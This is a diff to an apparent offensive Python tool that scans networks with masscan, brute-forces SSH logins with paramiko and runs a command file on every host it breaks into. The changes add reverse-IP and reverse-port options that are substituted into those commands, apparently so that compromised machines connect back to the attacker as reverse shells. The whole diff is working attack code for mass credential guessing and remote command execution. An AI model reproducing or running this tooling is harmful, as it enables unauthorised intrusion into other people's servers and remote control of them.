@@ -16,6 +16,18 @@ import sys
 import os
 import re
 
+def get_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        # doesn't even have to be reachable
+        s.connect(('10.255.255.255', 1))
+        IP = s.getsockname()[0]
+    except:
+        IP = '127.0.0.1'
+    finally:
+        s.close()
+    return IP
+ 
 # make paramiko actually throw errors we can deal with.
 logging.getLogger("paramiko").setLevel(logging.CRITICAL)
 logging.getLogger("masscan").setLevel(logging.CRITICAL)
@@ -100,6 +112,7 @@ def testCreds(tid):
             client.connect(*attempt, look_for_keys=False)
             print(colored('[###]', 'green'), 'ssh %s@%s -p %d password: %s' % (attempt[2],attempt[0],attempt[1], attempt[3]))
             sucessfulAttempts[attempt] = attempt
+
             for command in commands:
                 client.exec_command(command)
             if retry:
@@ -129,12 +142,15 @@ def main():
 
     retry = args.retry
     threads = []
-
+    
     with open(args.config) as fp:
         config = json.load(fp)
-
+    
     with open(args.commandsToRun) as fp:
-        commands = tuple(fp)
+        commands = fp.read()
+    commands = commands.replace('$FUN_IP', args.reverseIP, commands.count('$FUN_IP'))
+    commands = commands.replace('$FUN_PORT', args.reversePort, commands.count('$FUN_PORT'))
+    commands = tuple(commands.split('\n'))
 
     if args.noScan:
         hosts = []
@@ -162,7 +178,7 @@ def main():
             hostsToScan = ' '.join(config['netcfg']['hosts'])
             portsToScan = ','.join(config['netcfg']['ports'])
             try:
-                scanWithMetadata = scaner.scan(hostsToScan, portsToScan, arguments='--wait %d' % args.wait)
+                scanWithMetadata = scaner.scan(hostsToScan, portsToScan, arguments='--wait %d' % (args.wait))
             except (masscan.PortScannerError, masscan.NetworkConnectionError) as e:
                 sys.stderr.write(colored('[!!!]', 'red') + "Error running scan: %s\n" % str(e))
                 exit(1)
@@ -284,5 +300,7 @@ if __name__ == '__main__':
     parser.add_argument('-c', '--commandsToRun', type=str, default='fun.sh')
     parser.add_argument('-t','--numThreads', type=int, default=5)
     parser.add_argument('-w', '--wait', type=int, default=3)
+    parser.add_argument('--reverseIP', type=str, default=get_ip())
+    parser.add_argument('--reversePort', type=str, default='5967')
     args = parser.parse_args()
     main()
